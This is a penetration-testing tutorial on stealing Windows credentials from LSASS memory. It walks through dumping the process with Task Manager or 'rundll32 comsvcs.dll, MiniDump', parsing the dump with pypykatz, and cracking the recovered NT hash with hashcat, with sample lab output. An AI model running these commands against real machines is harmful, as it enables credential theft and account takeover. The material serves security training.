# Attacking LSASS

## Table of Contents

- [1. Dumping LSASS process memory](#1-dumping-lsass-process-memory)
  - [Method A: Task Manager (needs a GUI session)](#method-a-task-manager-needs-a-gui-session)
  - [Method B: rundll32 + comsvcs.dll (command-line only)](#method-b-rundll32--comsvcsdll-command-line-only)
- [2. Extract credentials from the dump with Pypykatz](#2-extract-credentials-from-the-dump-with-pypykatz)
- [3. Crack the recovered hash](#3-crack-the-recovered-hash)

---

## Why LSASS, not just SAM?

We already covered pulling password hashes out of the SAM database. But there's another target worth going after: **LSASS**, the Windows process that actually handles logins in real time.

Remember from earlier — the moment someone logs in, LSASS:
- Caches their credentials in memory
- Creates access tokens for them
- Enforces security policies
- Logs security events

The key word is **caches in memory**. While SAM gives you hashes for accounts that exist on the machine, LSASS gives you a live snapshot of **whoever is actually logged in right now** — which can sometimes include recoverable passwords, Kerberos tickets, and more, not just hashes.

### Requirement

**You'll need `local Administrator` privilege at minimum — and often you need to go a step further than that**.

#### Why admin alone isn't always quite enough

LSASS runs as the `SYSTEM` account, which outranks even a local Administrator. To open a handle to another process's memory, Windows requires the **`SeDebugPrivilege`** — a privilege that lets a process attach to and read the memory of processes it wouldn't normally be allowed to touch, including ones running as a higher-privileged account.

- Local Administrators **have** `SeDebugPrivilege` available to them, but it's not active by default — it needs to be explicitly enabled before use.
- Tools like Mimikatz, Pypykatz-generating scripts, or even `rundll32`/`comsvcs.dll` typically enable this privilege automatically as part of their normal operation — but they can only do so because you're already running in an **elevated (admin) context** to begin with. A non-elevated admin session (i.e., UAC hasn't been bypassed) won't be able to use it.

So practically: **you need an elevated session running as a user in the local Administrators group** — that's the real minimum bar.

#### There's a second wall on modern Windows: PPL

Newer versions of Windows can run LSASS as a **Protected Process Light (PPL)**. When this is enabled:

- Even `SeDebugPrivilege` + full admin rights **isn't enough** to open a normal memory handle to LSASS.
- Standard dumping tools like plain `rundll32`/`comsvcs.dll` will simply fail or get blocked.
- Attackers then need more advanced techniques to work around PPL — things like loading a signed-but-vulnerable driver to strip the protection, or using built-in Windows components that are themselves allowed to touch protected processes.

Whether PPL is enabled depends entirely on the target's configuration — plenty of real-world environments still don't have it turned on.

---

## 1. Dumping LSASS process memory

Just like with SAM, the smart move is to create a memory **dump file** first, then do all the actual extraction work offline on your own machine. That way you spend minimal time actively poking at the target.

### Method A: Task Manager (needs a GUI session)

If you have interactive graphical access to the target:

1. Open Task Manager
2. Go to the **Processes** tab
3. Right-click **Local Security Authority Process**
4. Select **Create dump file**

This saves a file called `lsass.DMP` into `%temp%`, which you then transfer to your attack machine (same file-transfer approach covered for SAM — e.g., an SMB share).

### Method B: rundll32 + comsvcs.dll (command-line only)

If you only have a shell (no GUI), there's a command-line equivalent — and it's actually faster and more flexible since it doesn't require an interactive desktop session.

**⚠️ Heads up:** modern antivirus products specifically flag this technique as malicious, so it often gets blocked outright unless AV has already been bypassed or disabled (a separate topic on its own).

**First, find LSASS's process ID (PID):**

From `cmd`:
```cmd
C:\Windows\system32> tasklist /svc
```
```
Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
...                                 .......
......                              .......
......                              .......
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc    <----- It's here
```

Or from PowerShell:
```powershell
PS C:\Windows\system32> Get-Process lsass
```
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

**Then create the dump file** (requires an elevated PowerShell session):
```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

What's happening here: `rundll32.exe` is calling a function inside `comsvcs.dll` (specifically `MiniDumpWriteDump`) which is Windows' own built-in memory-dumping function — normally used by developers debugging crashes, repurposed here to dump LSASS's live memory to `C:\lsass.dmp`.

Once you've got `lsass.dmp`, transfer it over to your attack machine the same way as before.

---

## 2. Extract credentials from the dump with Pypykatz

The classic tool for parsing credential data out of an LSASS dump is **Mimikatz** — but it only runs on Windows. That's a problem if your attack box is Linux.

Enter **Pypykatz**: a full Python reimplementation of Mimikatz's core logic, meaning it runs directly on Linux. All you need is the `.dmp` file — no Windows attack box, no running anything directly on the target.

### Running it

```bash
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

This tells Pypykatz: parse the LSA subsystem's secrets (`lsa`) from a minidump file at the given path.

### Example (trimmed) output

```
== LogonSession ==
username bob
domainname DESKTOP-33E7O54
sid S-1-5-21-4019466498-1700476312-3544718034-1001
    == MSV ==
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
    == WDIGEST ==
        password None
    == Kerberos ==
        Username: bob
    == DPAPI ==
        masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a4911...
```

Each `LogonSession` block represents a logged-on session LSASS had cached at the moment the dump was taken — essentially a snapshot of every active login, broken down by authentication type.

---

## Understanding what Pypykatz pulls out

### MSV — the NT hash

```
== MSV ==
    Username: bob
    NT: 64f12cddaa88057e06a81b54e73b949b
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
```

**MSV** is the authentication package LSA uses to check logins against the local SAM database. This section is the most directly useful — it hands you the username, SID, and the NT (and SHA1) hash tied to that logon session, ready to crack offline.

### WDIGEST — sometimes a plaintext password, if you're lucky

```
== WDIGEST ==
    username bob
    password None
```

**WDIGEST** is a legacy authentication protocol. On Windows XP through 8, and Server 2003 through 2012, it was **enabled by default** — and critically, LSASS cached WDIGEST credentials **in plaintext**, not even hashed. On older, unpatched systems this could mean an instant plaintext password straight out of memory.

Modern Windows has WDIGEST **disabled by default** following a Microsoft security patch, which is exactly why the example above shows `password None` — this particular box wasn't vulnerable to that specific exposure.

### Kerberos — tickets for domain environments

```
== Kerberos ==
    Username: bob
    Domain: DESKTOP-33E7O54
```

In domain environments, users get **Kerberos tickets** after authenticating, which let them access shared network resources without re-entering their password each time. LSASS caches these tickets (along with related keys), and they can potentially be extracted and reused to access other systems on the same domain — without ever needing the plaintext password.

### DPAPI — the master key to decrypt saved app secrets

```
== DPAPI ==
    masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a4911...
```

This is the same DPAPI concept covered in the SAM/SECURITY guide — LSASS can hold the **masterkey** needed to decrypt DPAPI-protected secrets (saved browser passwords, Outlook passwords, Wi-Fi/VPN credentials, etc.) for whoever is logged in. Pulling this key from LSASS memory is one of the ways those secrets end up decrypted.

---

## 3. Crack the recovered hash

Once you have an NT hash from the MSV section, it's the exact same process covered earlier:

```bash
$ hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

```
64f12cddaa88057e06a81b54e73b949b:Password1
```

Cracked — `Password1` turns out to be bob's actual password.

---

## Quick Recap

| Step | Method | Notes |
|------|---------|-------|
| Dump LSASS memory (GUI) | Task Manager → Create dump file | Needs interactive desktop access |
| Dump LSASS memory (CLI) | `rundll32` + `comsvcs.dll MiniDump` | Faster, shell-only, but commonly flagged by AV |
| Extract credentials offline | Pypykatz (Python, runs on Linux) | Parses MSV, WDIGEST, Kerberos, DPAPI sections |
| Crack recovered hashes | Hashcat (`-m 1000` for NT) | Same workflow as SAM hashes |

**Key idea:** SAM tells you what accounts *exist*; LSASS tells you who's *actually logged in right now* — and depending on the Windows version and configuration, that memory can leak anything from an NT hash you still have to crack, all the way up to an outright plaintext password (via legacy WDIGEST) or reusable Kerberos tickets that skip password cracking entirely.

| Requirement | Needed? |
|---|---|
| Regular/standard user | ❌ Not enough |
| Local Administrator | ✅ Required baseline |
| Elevated session (not just "is admin") | ✅ Required to actually use `SeDebugPrivilege` |
| Bypassing PPL (if enabled) | ✅ Required only if the target has LSASS protection turned on |

**Bottom line:** you can't touch LSASS as a regular user — you need local admin rights at minimum, running in an elevated context, and on hardened systems with PPL enabled, you'll need additional bypass techniques on top of that just to get a memory handle in the first place.
